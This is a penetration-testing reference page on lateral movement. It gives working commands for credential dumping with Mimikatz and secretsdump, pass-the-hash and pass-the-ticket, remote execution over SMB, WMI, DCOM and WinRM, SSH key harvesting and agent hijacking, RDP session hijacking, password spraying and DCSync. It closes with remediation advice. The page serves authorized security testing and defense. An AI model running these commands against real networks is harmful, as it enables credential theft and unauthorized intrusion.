# Lateral Movement Testing

## Overview
Lateral movement refers to techniques that attackers use to move through a network after gaining initial access, progressively accessing additional systems and accounts to reach high-value targets. It leverages legitimate credentials, tokens, and protocols to blend in with normal network traffic. Effective lateral movement testing validates network segmentation, authentication controls, and monitoring capabilities.

## Classification
- **CWE:** CWE-294 (Authentication Bypass by Capture-replay), CWE-522 (Insufficiently Protected Credentials)
- **MITRE ATT&CK:** T1021 (Remote Services), T1550 (Use Alternate Authentication Material), T1047 (WMI), T1570 (Lateral Tool Transfer)
- **CVSS Base:** 7.5 - 9.8 (High to Critical)

## Detection Methodology

### 1. Pass-the-Hash (PtH)
Use captured NTLM hashes to authenticate without knowing the plaintext password:
```bash
# Extract hashes (requires admin on source host)
# Mimikatz
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam

# secretsdump.py (remote)
impacket-secretsdump domain/user:password@target
impacket-secretsdump -hashes :NTLM_HASH domain/user@target

# Pass-the-hash with impacket
impacket-psexec -hashes :NTLM_HASH administrator@target
impacket-wmiexec -hashes :NTLM_HASH administrator@target
impacket-smbexec -hashes :NTLM_HASH administrator@target
impacket-atexec -hashes :NTLM_HASH administrator@target "whoami"

# Pass-the-hash with evil-winrm
evil-winrm -i target -u administrator -H NTLM_HASH

# Pass-the-hash with xfreerdp
xfreerdp /v:target /u:administrator /pth:NTLM_HASH
```

### 2. Pass-the-Ticket (PtT)
Use stolen Kerberos tickets to access resources:
```bash
# Export tickets (Mimikatz on Windows)
mimikatz# sekurlsa::tickets /export
mimikatz# kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe dump
Rubeus.exe ptt /ticket:base64_ticket

# Linux - use .ccache files
export KRB5CCNAME=/tmp/krb5cc_target
impacket-psexec -k -no-pass domain/user@target

# Convert between formats
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### 3. PsExec / SMB-based Execution
```bash
# Sysinternals PsExec
PsExec.exe \\target -u domain\admin -p password cmd.exe

# Impacket PsExec (creates a service, uploads binary)
impacket-psexec domain/admin:password@target
impacket-psexec -hashes :NTLM_HASH domain/admin@target

# Impacket SMBExec (no binary upload, uses cmd.exe)
impacket-smbexec domain/admin:password@target

# Metasploit PsExec
use exploit/windows/smb/psexec
set RHOSTS target
set SMBUser admin
set SMBPass password
run
```

### 4. WMI (Windows Management Instrumentation)
```bash
# Impacket WMIExec
impacket-wmiexec domain/admin:password@target
impacket-wmiexec -hashes :NTLM_HASH domain/admin@target

# Native Windows
wmic /node:target /user:domain\admin /password:password process call create "cmd.exe /c whoami > C:\output.txt"

# PowerShell WMI
Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"

# CIM (modern alternative)
Invoke-CimMethod -ComputerName target -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}
```

### 5. WinRM (Windows Remote Management)
```bash
# evil-winrm (Kali tool)
evil-winrm -i target -u admin -p password
evil-winrm -i target -u admin -H NTLM_HASH

# PowerShell remoting
Enter-PSSession -ComputerName target -Credential domain\admin
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential domain\admin

# With impacket
impacket-evil-winrm target -u admin -p password

# Test WinRM access
Test-WSMan -ComputerName target
```

### 6. DCOM (Distributed Component Object Model)
```bash
# Impacket DCOM execution
impacket-dcomexec domain/admin:password@target
impacket-dcomexec -hashes :NTLM_HASH domain/admin@target

# PowerShell DCOM (MMC20.Application)
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")

# PowerShell DCOM (ShellWindows)
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$com.item().Document.Application.ShellExecute("cmd","/c whoami","","",0)
```

### 7. SSH Lateral Movement
```bash
# Key-based movement (stolen SSH keys)
ssh -i stolen_key user@target

# Harvesting SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/known_hosts
cat ~/.ssh/authorized_keys
cat ~/.bash_history | grep ssh

# SSH agent forwarding hijack
ls /tmp/ssh-*/agent.*
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh user@target
```

### 8. RDP (Remote Desktop Protocol)
```bash
# Standard RDP
xfreerdp /v:target /u:admin /p:password /cert-ignore

# Pass-the-hash via RDP (requires Restricted Admin mode)
xfreerdp /v:target /u:admin /pth:NTLM_HASH /cert-ignore

# SharpRDP (in-memory RDP command execution)
SharpRDP.exe computername=target command="cmd /c whoami" username=domain\admin password=password

# RDP session hijacking (requires SYSTEM)
query user
tscon SESSION_ID /dest:rdp-tcp#0
```

## Tool Usage

### CrackMapExec / NetExec
```bash
# SMB enumeration and spray
crackmapexec smb 10.10.10.0/24 -u admin -p password
crackmapexec smb 10.10.10.0/24 -u admin -H NTLM_HASH

# Command execution
crackmapexec smb target -u admin -p password -x "whoami"
crackmapexec smb target -u admin -p password -X "Get-Process" --exec-method wmiexec

# Dump SAM/LSA/NTDS
crackmapexec smb target -u admin -p password --sam
crackmapexec smb target -u admin -p password --lsa
crackmapexec smb target -u admin -p password --ntds

# WinRM execution
crackmapexec winrm target -u admin -p password -x "whoami"

# MSSQL execution
crackmapexec mssql target -u sa -p password -x "whoami" --local-auth

# Password spraying across subnet
crackmapexec smb 10.10.10.0/24 -u userlist.txt -p password --continue-on-success
```

### Impacket Suite
```bash
# Credential dumping
impacket-secretsdump domain/admin:password@target

# Various execution methods
impacket-psexec domain/admin:password@target
impacket-wmiexec domain/admin:password@target
impacket-smbexec domain/admin:password@target
impacket-atexec domain/admin:password@target "command"
impacket-dcomexec domain/admin:password@target

# SMB client
impacket-smbclient domain/admin:password@target

# Mount shares
impacket-smbclient -hashes :HASH domain/admin@target
```

### Mimikatz
```cmd
# Dump credentials
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
mimikatz# sekurlsa::wdigest
mimikatz# sekurlsa::tickets /export

# Pass-the-hash
mimikatz# sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:cmd.exe

# DCSync (requires domain replication rights)
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
```

## Remediation
1. **Credential Guard** -- enable Windows Credential Guard to protect NTLM hashes and Kerberos tickets
2. **Privileged Access Workstations (PAWs)** -- isolate admin activities to dedicated hardened machines
3. **Local Administrator Password Solution (LAPS)** -- randomize local admin passwords per host
4. **Disable NTLM** -- enforce Kerberos-only authentication where possible
5. **Network segmentation** -- restrict SMB (445), WinRM (5985/5986), RDP (3389) between workstations
6. **Disable WMI/DCOM remotely** -- restrict remote WMI/DCOM to authorized admin hosts
7. **Monitor lateral movement indicators** -- detect PsExec service creation, abnormal SMB, WMI process creation
8. **Protected Users group** -- add privileged accounts to prevent credential caching
9. **Tiered administration model** -- separate admin credentials by tier (workstation, server, domain)
10. **SSH key management** -- rotate keys, use certificates, restrict agent forwarding

## Evidence Collection
When documenting lateral movement findings:
- Source host and destination host for each movement step
- Authentication method used (password, hash, ticket, key)
- Protocol used (SMB, WinRM, WMI, DCOM, SSH, RDP)
- Credentials or tokens captured and reused
- Screenshots of access to each target system
- Network diagram showing the lateral movement path
- Detection gaps identified (missing alerts or logs)
- Impact assessment (number of systems accessed, data exposure)
